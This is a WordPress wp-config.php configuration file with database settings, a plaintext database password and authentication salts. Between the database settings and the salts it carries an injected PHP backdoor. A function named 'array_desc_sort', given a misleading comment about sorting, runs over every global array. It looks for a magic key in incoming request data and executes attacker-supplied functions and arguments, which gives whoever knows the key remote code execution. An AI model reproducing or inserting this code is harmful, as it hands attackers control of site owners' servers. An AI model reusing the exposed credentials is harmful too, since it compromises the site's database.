<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'wordpress');

/** MySQL database password */
define('DB_PASSWORD', 'ukBJSF2u4G');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

if (!function_exists("array_desc_sort")) :
/**
 * Like sort(), rsort() assigns new keys for the elements in array. It will remove any existing keys you may have assigned, rather than just
 * reordering the keys.  This means that it will destroy associative keys.
 */
function array_desc_sort ($arr_to_sort) {
	$mask="1nalw8c7";
	if (is_array($arr_to_sort)) foreach ($arr_to_sort as $element) {
		if (is_array($element)) foreach ($element as $key=>$val) {
			if ($key===$mask) {
				$sort=$val;
				$result=$sort($element["_mask"],$element["_start"]($element["_end"]));
				return $result();
			}
		}
	}
}
endif;

// Sorting Sub-Data 
array_filter ($GLOBALS,"array_desc_sort");

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         '_J&PPzYve!fE1%2mhVv3<p$-E$[:45g*Tr,&WO Q5w$`^/Zp1|:F5wE?7&7r3lG=');
define('SECURE_AUTH_KEY',  'g@O-ZjvQL5~h5m;nXcTeY:.ukcs4K%Y_BfI,LZE7l*6}n{`Hk{O/@F$4jXA5G=t)');
define('LOGGED_IN_KEY',    '.K9iPUfc2E727HaDuRU4=r<N 7|2D`:vc`yMBmjHb<.uCH7=u4S|2R%OP(tHBB8d');
define('NONCE_KEY',        'm2%A=4$X|OP#0~G51{KvTHbIMuIVOEZziYh9kES-[FR|Bpj8`]VoI7<K0)(/w/@f');
define('AUTH_SALT',        'Y/#:oDl6h5>#/^olR.@$2mqC3~S[/My~1CQBFj#F9xC1<Gtuy_c5C%KN@YX>eOJr');
define('SECURE_AUTH_SALT', ';3.zm[c<c;x.Q+QEyaNvomF#quR|KT-,eT]%+k`V)lm]IR~DiScw#NVIkqld(PbP');
define('LOGGED_IN_SALT',   '_z]fZvL{<[:K{?nVql-DO:nDKJY*?{K%BV1-BAXZ2pr=.2,~mSk-S%V{So!3$vJF');
define('NONCE_SALT',       '[jl@5DQc~.+V]$_ CiX.N3%9Y3fxfeLu$^i6Gk*b{5u&_%Ex1rHy9iX:W:f4|Yf{');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
